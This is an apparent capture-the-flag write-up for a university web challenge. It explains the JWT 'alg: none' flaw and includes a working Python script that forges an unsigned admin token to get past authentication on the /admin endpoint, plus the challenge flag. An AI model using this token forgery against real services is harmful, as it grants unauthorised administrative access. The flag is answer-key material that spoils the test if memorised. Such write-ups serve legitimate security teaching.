# TokenGate_MU (Security Impossible CTF 2026 - Monash University, web)

TokenGate provides a Node.js web application with administrative capabilities gated behind JSON Web Token (JWT) authentication. Accessing `/admin` requires a valid token possessing the claim `"role": "admin"`. The application signs tokens using a secret HMAC key that is not disclosed to clients.

## JSON Web Token Specification and the "none" Algorithm

A JSON Web Token consists of three base64url-encoded parts separated by periods:
`header.payload.signature`

The header specifies metadata about the token, including the signature algorithm (`alg`):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

RFC 7519 (JSON Web Token specification) defines an algorithm value named `"none"`, intended for unsecured tokens in environments where integrity protection has already been established by transport security or out-of-band protocols. For `"none"` tokens, the signature part is completely omitted, resulting in:
`header.payload.` (note the trailing period).

Flawed JWT verification libraries often determine which verification algorithm to use based directly on the `alg` parameter specified in the unverified token header. If the library allows `alg: "none"` and the application fails to enforce an algorithm whitelist, the library skips cryptographic signature verification entirely and accepts the token as valid.

## Analyzing the Guest Token

Logging into the application as a guest generates the following token:

```bash
curl -s http://$TARGET:3000/login -d 'user=guest'
```

Decoding the token parts:
- Header: `{"alg":"HS256","typ":"JWT"}`
- Payload: `{"user":"guest","role":"user","iat":1700000000}`
- Signature: 32-byte HMAC-SHA256 signature

Attempting to access `/admin` with this token returns:
`403 Forbidden: Admin privileges required.`

## Forging an alg:none Token

To test for algorithm confusion, we craft a modified token:
1. Set the header `alg` field to `"none"` (or variations such as `"None"`, `"NONE"`).
2. Modify the payload claim to set `"role": "admin"`.
3. Set the signature to an empty string.

We implement the token forging routine in Python:

```python
import base64
import json
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "target-web-03-tokengate"
PORT = 3000

def b64url_encode(data_dict):
    json_bytes = json.dumps(data_dict, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(json_bytes).decode().rstrip("=")

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "guest", "role": "admin", "iat": 1700000000}

forged_token = f"{b64url_encode(header)}.{b64url_encode(payload)}."

print(f"Forged Token: {forged_token}")

headers = {"Authorization": f"Bearer {forged_token}"}
resp = requests.get(f"http://{TARGET}:{PORT}/admin", headers=headers)

print(f"Status Code: {resp.status_code}")
print(f"Response Body: {resp.text}")
```

Sending the forged token in the `Authorization: Bearer` header bypasses signature verification. The server evaluates `role == "admin"` and returns the flag.

Solve: `solve/solve.py`

Flag: `sictf{1d6a04746fe61339dc20dd3bc86560fb}`
